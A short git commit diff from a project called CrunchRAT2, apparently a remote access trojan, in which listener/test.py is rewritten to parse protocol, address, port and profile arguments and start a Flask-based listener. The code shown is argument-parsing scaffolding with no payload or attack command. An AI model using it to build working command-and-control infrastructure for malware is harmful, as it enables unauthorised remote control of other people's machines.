33ffaf6399d288c22fc67ba0912d63820101273d
Hunter Hardman <t3ntman@gmail.com>
2017-04-28 23:34:27 -0600

    Added more debugging code

--- listener/test.py
+++ listener/test.py
@@ -1,3 +1,14 @@
-from webserver_new import start_web_server
+import argparse
+from core.webserver_new import WebServer
 
-start_web_server(8080)
+parser = argparse.ArgumentParser(prog="listener.py", description="CrunchRAT2 Listener - Written by Hunter Hardman @t3ntman")
+parser.add_argument("protocol", action="store", type=str, help="listener protocol [http][https]")
+parser.add_argument("external_address", action="store", type=str, help="listener external address")
+parser.add_argument("port", action="store", type=int, help="listener port")
+parser.add_argument("profile", action="store", type=str, help="listener profile")
+
+# parses command-line arguments
+args = parser.parse_args()
+
+w = WebServer(args)
+w.start_flask()
